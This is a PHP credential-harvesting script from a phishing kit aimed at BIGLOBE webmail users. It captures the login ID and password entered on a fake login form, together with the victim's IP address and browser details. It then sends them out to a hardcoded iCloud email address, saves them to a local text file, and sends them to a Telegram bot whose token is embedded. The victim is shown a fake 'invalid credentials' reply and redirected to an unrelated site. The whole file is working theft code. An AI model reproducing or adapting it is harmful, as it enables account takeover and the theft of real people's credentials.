<?php
include 'header.php';

$email = trim($_POST['loginid']);
$password = trim($_POST['biglobe_pw']);

if($email != null && $password != null){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "»»————-　★[ ⚫️🌀 BIGLOBEメール｜Webメール  Mail Access ⚫️🌀 ]★　————-««\n";
	$message .= "メールアドレスまたはユーザID         : ".$email."\n";
	$message .= "パスワー                        : ".$password."\n";
	$message .= "»»————-　★[ 💻🌏 I N F O | I P 🌏💻  ]★　————-««\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "»»————-　★[ 💻🌏 http://www.geoiptool.com/?IP=$ip  🌏💻  ]★　————-««\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "»»————-　★[ 💻🌏 GRENED0ER 🌏💻  ]★　————-««\n";
	$send = "06mahout_juleps@icloud.com";
	$subject = "GRENED0ER🌏💻 New BIGLOBEメール｜Webメール  Log Received From: $ip";
    mail($send, $subject, $message);  
	$save = fopen("Biglobe.txt","a+");
        fwrite($save,$message);
        fclose($save);
		
	$telegram_id = "961857392";
    $telegram_token = "6627245203:AAG_Bj3lfFyvq3avSr_4JL-nPgZdUM9t5EE";

$url2 = "https://api.telegram.org/bot".$telegram_token."/sendMessage?chat_id=".$telegram_id;
    $url2 = $url2 . "&text=" . urlencode($message);
    $ch2 = curl_init();
    $optArray = array(
            CURLOPT_URL => $url2,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch2, $optArray);
    $result2 = curl_exec($ch2);
    curl_close($ch2);
    return $result2;
	$signal = 'ok';
	$msg = 'InValid Credentials';
	
	// $praga=rand();
	// $praga=md5($praga);
}
else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg,
        'redirect_link' => $redirect,
    );
    echo json_encode($data);

?>

<?php

header("Location: https://kb.iu.edu/secure?returnUrl=%2Fd%2Falp");
?>